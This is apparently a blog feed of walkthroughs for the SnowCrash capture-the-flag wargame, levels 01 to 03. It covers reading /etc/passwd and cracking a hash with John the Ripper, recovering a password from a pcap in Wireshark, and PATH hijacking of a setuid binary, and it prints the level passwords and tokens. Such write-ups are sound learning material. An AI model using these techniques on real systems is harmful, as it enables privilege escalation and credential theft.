+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level03@SnowCrash:~<span class="nv">$ </span><span class="nb">ln</span> <span class="nt">-s</span> /bin/getflag /tmp/echo
+level03@SnowCrash:~<span class="nv">$ </span><span class="nb">export </span><span class="nv">PATH</span><span class="o">=</span><span class="s2">"/tmp:</span><span class="nv">$PATH</span><span class="s2">"</span>
+level03@SnowCrash:~<span class="nv">$ </span>./level03
+Check flag.Here is your token :qi0maab88jeaj46qoumi7maus
+</code></pre></div></div>
+<ul>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">ln</code>: to create the links for the files</p>
+  </li>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">-s</code>: option to specify that this will be a symbolic link.</p>
+  </li>
+  <li>
+    <p>/bin/getflag : Location that is stored Password</p>
+  </li>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">export PATH="/tmp:$PATH"</code> : Add the PATH environment variable to pointing /tmp directory.</p>
+  </li>
+</ul>
+
+<h4 id="7--we-got-a-token-for-next-level04">7.  We got a token for next level04</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>qi0maab88jeaj46qoumi7maus
+</code></pre></div></div>]]></content><author><name>Yoo</name></author><category term="Cyber" /><category term="security" /><category term="CyberSecurity" /><category term="Github" /><category term="Git" /><summary type="html"><![CDATA[Project SECURITY. This project is a modest introduction to the wide world of cyber security. A world where you’ll have no margin for errors.]]></summary></entry><entry><title type="html">Snow-crash Level02</title><link href="http://localhost:4000/cyber/security/Level02/" rel="alternate" type="text/html" title="Snow-crash Level02" /><published>2024-02-12T00:00:00+09:00</published><updated>2024-02-12T00:00:00+09:00</updated><id>http://localhost:4000/cyber/security/Level02</id><content type="html" xml:base="http://localhost:4000/cyber/security/Level02/"><![CDATA[<h4 id="1-the-password-of-level02-is-the-token-that-got-from-level01">1. The password of level02 is the token that got from level01.</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>f2av5il02puano7naaf6adaaf
+
+</code></pre></div></div>
+<h4 id="2-so-try-login-to-level02-with-the-password-we-got-from-level01-and-try-to-put-the-command-ls-we-can-see-the-file-level01pcap">2. So, try login to level02 with the password we got from level01 and try to put the command ‘ls’. We can see the file ‘level01.pcap’.</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level01@SnowCrash:~$ su level02
+Password: f2av5il02puano7naaf6adaaf
+level02@SnowCrash:~$ ls
+level02.pcap
+</code></pre></div></div>
+
+<h4 id="3-so-what-is-a-pcap-file-you-can-check-the-detail-answer-the-following-link">3. So, what is a PCAP file? You can check the detail answer the following link.</h4>
+
+<p><a href="https://www.endace.com/learn/what-is-a-pcap-file">What is a PCAP file?</a></p>
+
+<p>pcap (short for Packet Capture) file is a binary file format used to store network packet data captured during network traffic monitoring or analysis. These files can be created by various packet sniffing tools and network monitoring software. The format is widely supported, making it a standard way to store and exchange captured network data.</p>
+
+<h4 id="4-as-explained-in-the-link-for-read-the-pcap-file-we-will-use-the-program-wireshark-to-open-ths-pcap-file-we-will-safely-copy-level02pcap-file-in-another-local-terminal-and-we-will-open-with-a-tool-wireshark">4. As explained in the link, for read the PCAP file, we will use the program Wireshark. To open ths pcap file, we will safely copy level02.pcap file in “another local terminal” and we will open with a tool “WireShark”</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>scp -P 4242 level02@127.0.0.1:/home/user/level02/level02.pcap /tmp
+</code></pre></div></div>
+
+<h4 id="5-go-look-for-tmp-in-terminal-and-we-successfully-downloaded-the-pcap-file">5. Go look for /tmp in terminal and we successfully downloaded the pcap file.</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level02.pcap      100% 8302     8.1KB/s   00:00
+
+</code></pre></div></div>
+<h4 id="6-open-the-pcap-file-with-wireshark-we-found-the-clue-of-the-password-as-you-can-see-the-foloowing-image">6. Open the pcap file with WireShark. We found the clue of the password as you can see the foloowing image.</h4>
+
+<p><img src="/assets/image.png" alt="img" /></p>
+
+<h4 id="7-to-know-more-details-of-tcp-packets-clicked-the-follow-tcp-stream-dialog-box-the-stream-content-is-displayed-in-the-same-sequence-as-it-appeared-on-the-network">7. To know more details of TCP Packets, clicked the “Follow TCP Stream” dialog box. The stream content is displayed in the same sequence as it appeared on the network.</h4>
+
+<p>TCP Streams are “Segmented and Shipped by IP Packets”.</p>
+
+<p>TCP sends its data in little chunks called IP packets (or IP datagrams). In this way, HTTP is the top layer in a “protocol stack” of “HTTP over TCP over IP,”</p>
+
+<p><img src="/assets/image-1.png" alt="img" /></p>
+
+<p>we can see the clue of the password as below. But this is still NOT the correct password.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Password: ft_wandr...NDRel.L0L
+</code></pre></div></div>
+<p>In this case, let’s change display to “hexdump” And let’s see if they’re correctly corresponded to the HEX number and see if they’re printable.</p>
+
+<p><img src="/assets/image-2.png" alt="img" /></p>
+
+<table>
+  <thead>
+    <tr>
+      <th>HEX</th>
+      <th>66</th>
+      <th>74</th>
+      <th>5f</th>
+      <th>77</th>
+      <th>61</th>
+      <th>6e</th>
+      <th>64</th>
+      <th>72</th>
+      <th>7f</th>
+      <th>7f</th>
+      <th>7f</th>
+      <th>4e</th>
+      <th>44</th>
+      <th>52</th>
+      <th>65</th>
+      <th>6c</th>
+      <th>7f</th>
+      <th>4c</th>
+      <th>30</th>
+      <th>4c</th>
+      <th>0d</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>Ascii</td>
+      <td>f</td>
+      <td>t</td>
+      <td>_</td>
+      <td>w</td>
+      <td>a</td>
+      <td>n</td>
+      <td>d</td>
+      <td>r</td>
+      <td>DEL</td>
+      <td>DEL</td>
+      <td>DEL</td>
+      <td>N</td>
+      <td>D</td>
+      <td>R</td>
+      <td>e</td>
+      <td>l</td>
+      <td>DEL</td>
+      <td>L</td>
+      <td>0</td>
+      <td>L</td>
+      <td>RETURN</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>HEX 7f corresponded to DEL : So, n, d, r will be deleted and same for l.
+HEX 0d corresponded to CARRIAGE_RETURN (‘\r’) : so it represent the end of the line.
+So, password should be from ft_wandr…NDRel.L0L to ft_waNDReL0L</p>
+
+<p>So, we found our password! Let’s put our password into flag02</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level02@SnowCrash:~$ su flag02
+Password: 
+Don't forget to launch getflag !
+flag02@SnowCrash:~$ getflag
+Check flag.Here is your token : kooda2puivaav1idi4f57q8iq
+flag02@SnowCrash:~$ ^C
+flag02@SnowCrash:~$ 
+</code></pre></div></div>
+
+<h4 id="8-we-got-a-token-for-next-level03">8. We got a token for next level03</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kooda2puivaav1idi4f57q8iq
+</code></pre></div></div>]]></content><author><name>Yoo</name></author><category term="Cyber" /><category term="security" /><category term="CyberSecurity" /><category term="Github" /><category term="Git" /><summary type="html"><![CDATA[Project SECURITY. This project is a modest introduction to the wide world of cyber security. A world where you’ll have no margin for errors.]]></summary></entry><entry><title type="html">Snow-crash Level01</title><link href="http://localhost:4000/cyber/security/level01/" rel="alternate" type="text/html" title="Snow-crash Level01" /><published>2023-12-11T00:00:00+09:00</published><updated>2023-12-11T00:00:00+09:00</updated><id>http://localhost:4000/cyber/security/level01</id><content type="html" xml:base="http://localhost:4000/cyber/security/level01/"><![CDATA[<h4 id="1-the-password-of-level01-is-the-token-that-got-from-level00">1. The password of level01 is the token that got from level00.</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> x24ti5gi3x0ol2eh4esiuxias
+</code></pre></div></div>
+<h4 id="2-so-try-login-to-level01-with-the-password-we-got-from-level00">2. So, try login to level01 with the password we got from level00.</h4>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>flag00@SnowCrash:~$ su level01
+Password: (x24ti5gi3x0ol2eh4esiuxias)
+level01@SnowCrash:~$
+</code></pre></div></div>
+<h4 id="3--try-to-apply-the-same-logic-as-level00">3.  try to apply the same logic as level00.</h4>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find / -type f -user "flag01" 2&gt;/dev/null
+find / -type f -user "user01" 2&gt;/dev/null
+</code></pre></div></div>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>2&gt;/dev/null 
+Redirect error messages to null,
+effectively suppressing them =&gt; Nothing came out
+</code></pre></div></div>
+
+<h4 id="4-try-another-one">4. try another one.</h4>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find / -type f -user "level01" 2&gt;/dev/null
+</code></pre></div></div>
+<p>with this command, I got the results as below,</p>
+
+<p>but nothing is related to the “password” or “flag01” or “user01”</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/proc/2049/task/2049/fdinfo/0
+/proc/2049/task/2049/fdinfo/1
+/proc/2049/task/2049/fdinfo/2
+/proc/2049/task/2049/fdinfo/255
+/proc/2049/task/2049/ns/net
+/proc/2049/task/2049/ns/uts
+/proc/2049/task/2049/ns/ipc
+/proc/2049/task/2049/environ
+/proc/2049/task/2049/auxv
+/proc/2049/task/2049/status
+/proc/2049/task/2049/personality
+/proc/2049/task/2049/limits
+.....
+....
+...
+..
+</code></pre></div></div>
+<h4 id="5-so-try-to-find-the-other-command-with-the-password">5. So, try to find the other command with the password.</h4>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level01@SnowCrash:~$ cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+bin:x:2:2:bin:/bin:/bin/sh
+sys:x:3:3:sys:/dev:/bin/sh
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/bin/sh
+man:x:6:12:man:/var/cache/man:/bin/sh
+lp:x:7:7:lp:/var/spool/lpd:/bin/sh
+mail:x:8:8:mail:/var/mail:/bin/sh
+news:x:9:9:news:/var/spool/news:/bin/sh
+uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
+proxy:x:13:13:proxy:/bin:/bin/sh
+www-data:x:33:33:www-data:/var/www:/bin/sh
+backup:x:34:34:backup:/var/backups:/bin/sh
+list:x:38:38:Mailing List Manager:/var/list:/bin/sh
+irc:x:39:39:ircd:/var/run/ircd:/bin/sh
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
+nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
+libuuid:x:100:101::/var/lib/libuuid:/bin/sh
+syslog:x:101:103::/home/syslog:/bin/false
+messagebus:x:102:106::/var/run/dbus:/bin/false
+whoopsie:x:103:107::/nonexistent:/bin/false
+landscape:x:104:110::/var/lib/landscape:/bin/false
+sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin
+level00:x:2000:2000::/home/user/level00:/bin/bash
+level01:x:2001:2001::/home/user/level01:/bin/bash
+level02:x:2002:2002::/home/user/level02:/bin/bash
+level03:x:2003:2003::/home/user/level03:/bin/bash
+level04:x:2004:2004::/home/user/level04:/bin/bash
+level05:x:2005:2005::/home/user/level05:/bin/bash
+level06:x:2006:2006::/home/user/level06:/bin/bash
+level07:x:2007:2007::/home/user/level07:/bin/bash
+level08:x:2008:2008::/home/user/level08:/bin/bash
+level09:x:2009:2009::/home/user/level09:/bin/bash
+level10:x:2010:2010::/home/user/level10:/bin/bash
+level11:x:2011:2011::/home/user/level11:/bin/bash
+level12:x:2012:2012::/home/user/level12:/bin/bash
+level13:x:2013:2013::/home/user/level13:/bin/bash
+level14:x:2014:2014::/home/user/level14:/bin/bash
+flag00:x:3000:3000::/home/flag/flag00:/bin/bash
+flag01:42hDRfypTqqnw:3001:3001::/home/flag/flag01:/bin/bash
+flag02:x:3002:3002::/home/flag/flag02:/bin/bash
+flag03:x:3003:3003::/home/flag/flag03:/bin/bash
+flag04:x:3004:3004::/home/flag/flag04:/bin/bash
+flag05:x:3005:3005::/home/flag/flag05:/bin/bash
+flag06:x:3006:3006::/home/flag/flag06:/bin/bash
+flag07:x:3007:3007::/home/flag/flag07:/bin/bash
+flag08:x:3008:3008::/home/flag/flag08:/bin/bash
+flag09:x:3009:3009::/home/flag/flag09:/bin/bash
+flag10:x:3010:3010::/home/flag/flag10:/bin/bash
+flag11:x:3011:3011::/home/flag/flag11:/bin/bash
+flag12:x:3012:3012::/home/flag/flag12:/bin/bash
+flag13:x:3013:3013::/home/flag/flag13:/bin/bash
+flag14:x:3014:3014::/home/flag/flag14:/bin/bash
+level01@SnowCrash:~$
+</code></pre></div></div>
+
+<p>flag01:42hDRfypTqqnw:3001:3001::/home/flag/flag01:/bin/bash
+=&gt; Found the clue of flag01, maybe decode the “42hDRfypTqqnw”?</p>
+
+<h4 id="6-try-to-put-this-password--this-was-wrong-password">6. Try to put this password ? This was wrong password</h4>
+
+<p>The password is hashed, so need to find the algorithm to find the way to crack the hashed password</p>
+
+<p>=&gt; Need to use “John the Ripper” to crack the password, but John is not installed on the file</p>
+
+<p>https://www.openwall.com/john/</p>
+
+<p>John the Ripper : is the open source password cracking tool available for many operating systems.</p>
+
+<p>Need to know the notion of “hash”</p>
+
+<p>One way function =======&gt; Input -&gt; Hash Function -&gt; Output &lt;======= Impossible to reverse the hash</p>
+
+<p>Before executing the “John the Ripper”, first, we need to copy our password safely.
+scp :Secure Copy -P 4242 :connection for ssh, we use port 4242 level01@127.0.0.1: : user’s name and host address /etc/passwd : path of file that we will copy . : the place where we save our copy, “Current directory”</p>
+
+<p>scp -P 4242 level01@127.0.0.1:/etc/passwd .</p>
+
+<p>=&gt; Install the “John the Ripper”</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>brew install john
+</code></pre></div></div>
+<p>=&gt; Crack the password.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>echo "42hDRfypTqqnw" &gt; text
+john text --show
+ ?:abcdefg
+
+1 password hash cracked, 0 left
+</code></pre></div></div>
+
+<p>We got the password : abcdefg</p>
+
+<h4 id="7-lets-check-if-its-correct-">7. Let’s check if it’s correct !</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level01@SnowCrash:~$ su flag01
+Password: (abcdefg)
+Don't forget to launch getflag !
+flag01@SnowCrash:~$ getflag
+Check flag.Here is your token : f2av5il02puano7naaf6adaaf
+flag01@SnowCrash:~$
+</code></pre></div></div>
+<p>Voila ! 😁</p>
+
+<p>See you next level02 !</p>]]></content><author><name>Yoo</name></author><category term="Cyber" /><category term="security" /><category term="CyberSecurity" /><category term="Github" /><category term="Git" /><summary type="html"><![CDATA[Project SECURITY. This project is a modest introduction to the wide world of cyber security. A world where you’ll have no margin for errors.]]></summary></entry></feed>
